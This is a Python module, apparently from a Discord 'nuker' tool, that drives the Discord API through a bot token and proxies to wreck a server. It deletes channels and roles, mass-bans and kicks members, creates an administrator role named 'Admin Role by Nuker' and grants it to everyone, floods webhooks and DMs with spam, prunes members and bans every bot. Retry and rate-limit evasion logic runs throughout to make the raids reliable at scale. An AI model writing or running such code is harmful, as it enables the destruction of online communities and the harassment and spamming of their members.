# Plugins/nuking.py

import aiohttp
import asyncio
import json
import base64
import datetime
import random # Import random for jitter in retries
from Plugins.logger import Logger
from Plugins.tools import Tools

class Nuking:
    def __init__(self, token: str, guild_id: str):
        self.token = token
        self.guild_id = guild_id
        self.headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        self.timeout = aiohttp.ClientTimeout(total=15) # Increased default timeout slightly for more resilience

    async def _make_request(self, session, method, endpoint, **kwargs):
        """
        Helper to make API requests with robust error handling and rate limit retries.
        This function is critical for the script's reliability and performance.
        It handles general Discord API rate limits and logs detailed error responses.
        """
        url = Tools.api(endpoint)
        for attempt in range(5): # Allow up to 5 retry attempts for each request
            try:
                async with session.request(method, url, headers=self.headers, proxy=Tools.proxy(), timeout=self.timeout, **kwargs) as response:
                    # Handle global/route-specific rate limits
                    if response.status == 429:
                        try:
                            retry_after = float(response.headers.get("retry-after", 1))
                            await Logger.Log.warning(f"Rate limited on {endpoint}. Retrying after {retry_after:.2f} seconds (Attempt {attempt + 1}/5).")
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5)) # Add jitter to retry delay
                            continue # Retry the request immediately after delay
                        except ValueError:
                            await Logger.Error.error(f"Invalid retry-after header value for {endpoint}. Retrying after 1 second.")
                            await asyncio.sleep(1 + random.uniform(0.1, 0.5)) # Default sleep if header is invalid
                            continue
                    
                    # Log detailed error for 4xx client errors (e.g., 400 Bad Request, 403 Forbidden, 404 Not Found)
                    if response.status >= 400 and response.status < 500:
                        try:
                            error_details = await response.json()
                            await Logger.Error.error(f"HTTP error on {endpoint}: {response.status} - {response.reason}. Discord API details: {error_details} (Attempt {attempt + 1}/5).")
                        except aiohttp.ContentTypeError:
                            await Logger.Error.error(f"HTTP error on {endpoint}: {response.status} - {response.reason}. No JSON error details available. (Attempt {attempt + 1}/5).")
                        return False # Do not retry 4xx errors, as the request itself is fundamentally invalid or unauthorized
                    
                    response.raise_for_status() # Raise an exception for other HTTP errors (e.g., 5xx server errors)
                    
                    if response.status == 204: # No Content, typically indicates successful deletion/update
                        return True
                    
                    # Attempt to parse JSON response. Handle cases where response might be empty or not JSON.
                    try:
                        return await response.json()
                    except aiohttp.ContentTypeError:
                        if response.status == 200: # If status is 200 but no JSON, assume success
                            return True
                        await Logger.Error.error(f"Non-JSON response for {endpoint} with status {response.status}.")
                        return False
            
            except aiohttp.ClientResponseError as e:
                await Logger.Error.error(f"HTTP client error on {endpoint}: {e.status} - {e.message} (Attempt {attempt + 1}/5).")
            except aiohttp.ClientConnectorError as e:
                await Logger.Error.error(f"Connection error on {endpoint}: {e} (Attempt {attempt + 1}/5).")
            except asyncio.TimeoutError:
                await Logger.Error.error(f"Request to {endpoint} timed out (Attempt {attempt + 1}/5).")
            except Exception as e:
                await Logger.Error.error(f"An unexpected error occurred on {endpoint}: {e} (Attempt {attempt + 1}/5).")
            
            # If not the last attempt, wait before retrying with exponential backoff and jitter
            if attempt < 4: 
                delay = 1.5 ** attempt + random.uniform(0.1, 0.5) 
                await Logger.Log.warning(f"Waiting {delay:.2f} seconds before retrying {endpoint}...")
                await asyncio.sleep(delay)
        
        await Logger.Error.error(f"All retry attempts failed for {endpoint}.")
        return False # Return False if all retry attempts have failed

    async def delete_channel(self, session, channel_id: str):
        endpoint = f"channels/{channel_id}"
        return await self._make_request(session, "DELETE", endpoint)

    async def create_channel(self, session, name: str, channel_type: int = 0):
        """
        Creates a channel in the guild.
        :param session: aiohttp client session.
        :param name: Name of the channel.
        :param channel_type: 0 for text, 2 for voice.
        :return: Channel ID if successful, False otherwise.
        """
        endpoint = f"guilds/{self.guild_id}/channels"
        payload = {"name": name, "type": channel_type}
        response = await self._make_request(session, "POST", endpoint, json=payload)
        return response.get("id") if isinstance(response, dict) else False

    async def delete_role(self, session, role_id: str):
        endpoint = f"guilds/{self.guild_id}/roles/{role_id}"
        return await self._make_request(session, "DELETE", endpoint)

    async def create_role(self, session, name: str):
        """
        Creates a role in the guild with administrator permissions.
        :param session: aiohttp client session.
        :param name: Name of the role.
        :return: Role ID if successful, False otherwise.
        """
        endpoint = f"guilds/{self.guild_id}/roles"
        # Permissions for Administrator (bit 3, value 8)
        payload = {"name": name, "permissions": "8"}
        response = await self._make_request(session, "POST", endpoint, json=payload)
        return response.get("id") if isinstance(response, dict) else False

    async def ban(self, session, user_id: str, delete_message_days: int = 0):
        endpoint = f"guilds/{self.guild_id}/bans/{user_id}"
        payload = {"delete_message_days": delete_message_days}
        return await self._make_request(session, "PUT", endpoint, json=payload)

    async def kick(self, session, user_id: str):
        endpoint = f"guilds/{self.guild_id}/members/{user_id}"
        return await self._make_request(session, "DELETE", endpoint)

    async def unban(self, session, user_id: str):
        endpoint = f"guilds/{self.guild_id}/bans/{user_id}"
        return await self._make_request(session, "DELETE", endpoint)

    async def create_webhook(self, session, channel_id: str, name: str, avatar_url: str = None):
        """
        Creates a webhook in a specified channel.
        NOTE: The bot must have 'Manage Webhooks' permission in the target channel.
        """
        endpoint = f"channels/{channel_id}/webhooks"
        payload = {"name": name}
        if avatar_url:
            payload["avatar"] = await self._get_image_as_base64(avatar_url) # Convert image to base64
        
        # Explicitly log attempt to create webhook
        await Logger.Log.info(f"Attempting to create webhook '{name}' in channel {channel_id}...")
        response = await self._make_request(session, "POST", endpoint, json=payload)
        
        if isinstance(response, dict) and "id" in response:
            await Logger.Success.create(f"Webhook '{name}' created in channel {channel_id}.")
            return response.get("url")
        else:
            await Logger.Error.error(f"Failed to create webhook '{name}' in channel {channel_id}. Please ensure the bot has 'Manage Webhooks' permission in this channel and guild.")
            return False

    async def send_webhook_message(self, session, webhook_url: str, message: str, retries=5, backoff_factor=1.5):
        """
        Sends a single message to a webhook URL with robust retry logic for rate limits.
        This is specifically for webhook messages.
        """
        payload = {"content": message}
        for attempt in range(retries):
            try:
                async with session.post(webhook_url, json=payload, proxy=Tools.proxy(), timeout=self.timeout) as response:
                    if response.status == 429:
                        try:
                            retry_after = float(response.headers.get("retry-after", 1))
                            await Logger.Log.warning(f"Webhook rate limited on {webhook_url}. Retrying after {retry_after:.2f} seconds (Attempt {attempt + 1}/{retries}).")
                            await asyncio.sleep(retry_after + random.uniform(0.1, 0.5)) # Add jitter
                            continue # Retry the request
                        except ValueError:
                            await Logger.Error.error(f"Invalid retry-after header value for webhook {webhook_url}. Retrying after 1 second.")
                            await asyncio.sleep(1 + random.uniform(0.1, 0.5))
                            continue
                    
                    response.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
                    return True # Message sent successfully
            except aiohttp.ClientResponseError as e:
                await Logger.Error.error(f"HTTP error sending webhook message to {webhook_url}: {e.status} - {e.message} (Attempt {attempt + 1}/{retries}).")
            except aiohttp.ClientConnectorError as e:
                await Logger.Error.error(f"Connection error sending webhook message to {webhook_url}: {e} (Attempt {attempt + 1}/{retries}).")
            except asyncio.TimeoutError:
                await Logger.Error.error(f"Sending webhook message to {webhook_url} timed out (Attempt {attempt + 1}/{retries}).")
            except Exception as e:
                await Logger.Error.error(f"An unexpected error occurred sending webhook message to {webhook_url}: {e} (Attempt {attempt + 1}/{retries}).")
            
            if attempt < retries - 1:
                delay = backoff_factor ** attempt + random.uniform(0.1, 0.5)
                await Logger.Log.warning(f"Waiting {delay:.2f} seconds before retrying webhook {webhook_url}...")
                await asyncio.sleep(delay)
        
        await Logger.Error.error(f"All retries failed for webhook {webhook_url}.")
        return False # All retries failed

    async def send_webhook_bulk(self, session, webhook_url: str, message: str, count: int):
        """
        Sends multiple webhook messages sequentially to a single webhook URL.
        This helps prevent hitting per-webhook rate limits as severely.
        """
        success_count = 0
        for i in range(count):
            await Logger.Log.info(f"Sending message {i+1}/{count} to webhook {webhook_url}...")
            if await self.send_webhook_message(session, webhook_url, message):
                success_count += 1
            else:
                await Logger.Error.error(f"Failed to send message {i+1}/{count} to webhook {webhook_url}. Stopping for this webhook.")
                # If a message fails, it's likely due to persistent rate limits or a broken webhook, so stop for this one
                break 
            # Add a minimal delay between messages to the same webhook to be less aggressive
            # This delay is crucial for avoiding immediate 429s on a single webhook.
            await asyncio.sleep(0.05 + random.uniform(0, 0.02)) # Very small delay with jitter

        if success_count < count:
            await Logger.Error.error(f"Only sent {success_count} out of {count} messages to {webhook_url}.")
        return success_count > 0 # Return True if at least one message was sent successfully


    async def send_message(self, session, channel_id: str, message: str):
        endpoint = f"channels/{channel_id}/messages"
        payload = {"content": message}
        response = await self._make_request(session, "POST", endpoint, json=payload)
        return response is not False # True if request was successful (even if no content)

    async def rename_channel(self, session, new_name: str, channel_id: str):
        endpoint = f"channels/{channel_id}"
        payload = {"name": new_name}
        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def rename_role(self, session, role_id: str, new_name: str):
        endpoint = f"guilds/{self.guild_id}/roles/{role_id}"
        payload = {"name": new_name}
        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def change_nick(self, session, user_id: str, new_nick: str = None):
        endpoint = f"guilds/{self.guild_id}/members/{user_id}"
        payload = {"nick": new_nick}
        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def rename_guild(self, session, new_name: str):
        endpoint = f"guilds/{self.guild_id}"
        payload = {"name": new_name}
        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def change_guild_icon(self, session, icon_path: str):
        endpoint = f"guilds/{self.guild_id}"
        try:
            with open(icon_path, "rb") as f:
                encoded_image = base64.b64encode(f.read()).decode('utf-8')
            payload = {"icon": f"data:image/png;base64,{encoded_image}"} # Assuming PNG, adjust if needed
            return await self._make_request(session, "PATCH", endpoint, json=payload)
        except FileNotFoundError:
            await Logger.Error.error(f"Icon file not found: {icon_path}")
            return False
        except Exception as e:
            await Logger.Error.error(f"Failed to read or encode icon: {e}")
            return False

    async def remove_emoji(self, session, emoji_id: str):
        endpoint = f"guilds/{self.guild_id}/emojis/{emoji_id}"
        return await self._make_request(session, "DELETE", endpoint)

    async def send_direct_message(self, session, user_id: str, message: str):
        # First, create a DM channel
        create_dm_endpoint = "users/@me/channels"
        dm_payload = {"recipient_id": user_id}
        dm_channel_response = await self._make_request(session, "POST", create_dm_endpoint, json=dm_payload)

        if isinstance(dm_channel_response, dict) and "id" in dm_channel_response:
            dm_channel_id = dm_channel_response["id"]
            # Then, send the message to the DM channel
            send_message_endpoint = f"channels/{dm_channel_id}/messages"
            message_payload = {"content": message}
            return await self._make_request(session, "POST", send_message_endpoint, json=message_payload)
        else:
            await Logger.Error.error(f"Failed to create DM channel with user {user_id}")
            return False

    async def timeout_member(self, session, user_id: str, duration_seconds: int):
        endpoint = f"guilds/{self.guild_id}/members/{user_id}"
        # Discord API expects an ISO8601 timestamp for communication_disabled_until
        # 0 duration means removing timeout
        if duration_seconds > 0:
            # Calculate the timestamp in UTC
            timeout_dt = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=duration_seconds)
            communication_disabled_until = timeout_dt.isoformat(timespec='milliseconds')
            payload = {"communication_disabled_until": communication_disabled_until}
        else:
            payload = {"communication_disabled_until": None} # Remove timeout

        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def prune_members(self, session, days: int):
        endpoint = f"guilds/{self.guild_id}/prune"
        payload = {"days": days, "compute_prune_count": True}
        response = await self._make_request(session, "POST", endpoint, json=payload)
        return response.get("pruned") if isinstance(response, dict) else None

    async def give_admin_role(self, session, target_user_id: str = None):
        """
        Gives an admin role to all members or a specific user.
        If target_user_id is None, it attempts to give admin to all members.
        """
        # Create an admin role if it doesn't exist or find an existing one
        admin_role_id = None
        roles_endpoint = f"guilds/{self.guild_id}/roles"
        roles_data = await self._make_request(session, "GET", roles_endpoint)
        if isinstance(roles_data, list):
            for role in roles_data:
                # Check for administrator permission (bit 3, value 8)
                if (int(role.get("permissions", "0")) & 8) == 8:
                    admin_role_id = role["id"]
                    await Logger.Log.info(f"Found existing admin role: {role['name']} ({admin_role_id})")
                    break

        if not admin_role_id:
            await Logger.Log.info("No existing admin role found, creating one...")
            admin_role_name = "Admin Role by Nuker"
            admin_role_response = await self.create_role(session, admin_role_name)
            if admin_role_response:
                admin_role_id = admin_role_response
                await Logger.Success.create(f"Created new admin role: {admin_role_name} ({admin_role_id})")
            else:
                await Logger.Error.error("Failed to create admin role.")
                return False

        if not admin_role_id:
            return False # Cannot proceed without an admin role

        members_endpoint = f"guilds/{self.guild_id}/members"
        if target_user_id:
            # Give admin role to a specific user
            member_roles_endpoint = f"{members_endpoint}/{target_user_id}"
            member_data = await self._make_request(session, "GET", member_roles_endpoint)
            if isinstance(member_data, dict):
                current_roles = member_data.get("roles", [])
                if admin_role_id not in current_roles:
                    current_roles.append(admin_role_id)
                    payload = {"roles": current_roles}
                    if await self._make_request(session, "PATCH", member_roles_endpoint, json=payload):
                        await Logger.Success.success(f"Gave admin role to user {target_user_id}")
                        return True
                    else:
                        await Logger.Error.error(f"Failed to give admin role to user {target_user_id}")
                        return False
                else:
                    await Logger.Log.info(f"User {target_user_id} already has the admin role.")
                    return True
            else:
                await Logger.Error.error(f"Could not fetch member data for user {target_user_id}.")
                return False
        else:
            # Give admin role to all members
            all_members = await Tools.break_limit(session, members_endpoint, self.token)
            tasks = []
            for member_id in all_members:
                async def add_role_to_member(member_id_inner, role_id_inner):
                    member_roles_endpoint_inner = f"{members_endpoint}/{member_id_inner}"
                    member_data_inner = await self._make_request(session, "GET", member_roles_endpoint_inner)
                    if isinstance(member_data_inner, dict):
                        current_roles_inner = member_data_inner.get("roles", [])
                        if role_id_inner not in current_roles_inner:
                            current_roles_inner.append(role_id_inner)
                            payload_inner = {"roles": current_roles_inner}
                            if await self._make_request(session, "PATCH", member_roles_endpoint_inner, json=payload_inner):
                                await Logger.Success.success(f"Gave admin role to {member_id_inner}")
                                return True
                            else:
                                await Logger.Error.error(f"Failed to give admin role to {member_id_inner}")
                                return False
                        else:
                            await Logger.Log.info(f"Member {member_id_inner} already has the admin role.")
                            return True
                    else:
                        await Logger.Error.error(f"Could not fetch member data for {member_id_inner}.")
                        return False
                tasks.append(add_role_to_member(member_id, admin_role_id))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in results if r is True)
            failed_count = len(results) - success_count
            if failed_count > 0:
                await Logger.Error.error(f"Failed to give admin role to {failed_count} members.")
            return success_count > 0

    async def change_guild_vanity_url(self, session, new_code: str):
        """
        Changes the guild's vanity URL. Requires the guild to be boosted to Level 3.
        """
        endpoint = f"guilds/{self.guild_id}/vanity-url"
        payload = {"code": new_code}
        # PATCH request for vanity URL
        response = await self._make_request(session, "PATCH", endpoint, json=payload)
        return response is not False

    async def change_channel_topic(self, session, channel_id: str, new_topic: str):
        """
        Changes the topic of a specified channel.
        """
        endpoint = f"channels/{channel_id}"
        payload = {"topic": new_topic}
        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def update_guild_info(self, session, new_name: str = None, icon_path: str = None, description: str = None, verification_level: int = None):
        """
        Updates various guild information.
        """
        endpoint = f"guilds/{self.guild_id}"
        payload = {}
        if new_name is not None:
            payload["name"] = new_name
        if icon_path is not None:
            try:
                with open(icon_path, "rb") as f:
                    encoded_image = base64.b64encode(f.read()).decode('utf-8')
                payload["icon"] = f"data:image/png;base64,{encoded_image}"
            except FileNotFoundError:
                await Logger.Error.error(f"Icon file not found: {icon_path}")
                return False
            except Exception as e:
                await Logger.Error.error(f"Failed to read or encode icon: {e}")
                return False
        if description is not None:
            payload["description"] = description
        if verification_level is not None:
            payload["verification_level"] = verification_level
        
        if not payload:
            await Logger.Log.info("No guild information to update.")
            return True # Nothing to do

        return await self._make_request(session, "PATCH", endpoint, json=payload)

    async def ban_all_bots(self, session):
        """
        Bans all bot accounts in the guild.
        """
        members_endpoint = f"guilds/{self.guild_id}/members"
        all_members = await Tools.break_limit(session, members_endpoint, self.token)
        
        bot_ids = []
        for member_id in all_members:
            member_data = await self._make_request(session, "GET", f"guilds/{self.guild_id}/members/{member_id}")
            if isinstance(member_data, dict) and member_data.get("user", {}).get("bot"):
                bot_ids.append(member_id)

        if not bot_ids:
            await Logger.Log.info("No bots found in the guild.")
            return True

        await Logger.Log.info(f"Found {len(bot_ids)} bots to ban. Starting ban process...")
        tasks = []
        for bot_id in bot_ids:
            tasks.append(self.ban(session, bot_id))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        success_count = sum(1 for r in results if r is True)
        failed_count = len(results) - success_count
        
        if success_count > 0:
            await Logger.Success.success(f"Successfully banned {success_count} bots.")
        if failed_count > 0:
            await Logger.Error.error(f"Failed to ban {failed_count} bots.")
        
        return success_count > 0

    async def rename_emoji(self, session, emoji_id: str, new_name: str):
        """
        Renames a specific custom emoji in the guild.
        """
        endpoint = f"guilds/{self.guild_id}/emojis/{emoji_id}"
        payload = {"name": new_name}
        response = await self._make_request(session, "PATCH", endpoint, json=payload)
        return response is not False

    async def _get_image_as_base64(self, url: str):
        """
        Fetches an image from a URL and returns its base64 encoded string.
        """
        try:
            async with aiohttp.ClientSession() as temp_session:
                async with temp_session.get(url, timeout=self.timeout) as response:
                    response.raise_for_status()
                    content_type = response.headers.get('Content-Type', 'image/png')
                    image_data = await response.read()
                    encoded_image = base64.b64encode(image_data).decode('utf-8')
                    return f"data:{content_type};base64,{encoded_image}"
        except Exception as e:
            await Logger.Error.error(f"Failed to fetch or encode image from URL {url}: {e}")
            return None